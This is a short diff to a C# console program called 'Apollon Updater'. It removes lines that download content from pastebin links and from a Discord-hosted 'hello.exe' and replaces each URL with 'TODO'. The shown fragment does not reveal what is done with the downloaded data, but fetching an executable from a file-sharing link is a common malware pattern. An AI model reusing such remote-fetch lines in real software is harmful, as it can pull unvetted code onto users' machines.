@@ -17,11 +17,11 @@ namespace ApollonUpdater
                 Environment.Exit(0);
             }
             var client = new WebClient();
-            string nameOfIt = client.DownloadString("https://pastebin.com/raw/7vLkGGjD"); 
-            string apis = client.DownloadString("https://cdn.discordapp.com/attachments/710605084152692816/791495328779075614/hello.exe"); 
-            string paping = client.DownloadString("https://pastebin.com/raw/hVQkW7Vi"); 
-            string pinger = client.DownloadString("https://pastebin.com/raw/81fV1nRb"); 
-            string extension = client.DownloadString("https://pastebin.com/raw/Fy25bx1m");
+            string nameOfIt = client.DownloadString("TODO"); 
+            string apis = client.DownloadString("TODO"); 
+            string paping = client.DownloadString("TODO"); 
+            string pinger = client.DownloadString("TODO"); 
+            string extension = client.DownloadString("TODO");
             Random rnd = new Random();
             Console.OutputEncoding = System.Text.Encoding.Unicode;
             Console.Title = "Apollon Updater | Version: 1.0 | Name: " + Environment.UserName;
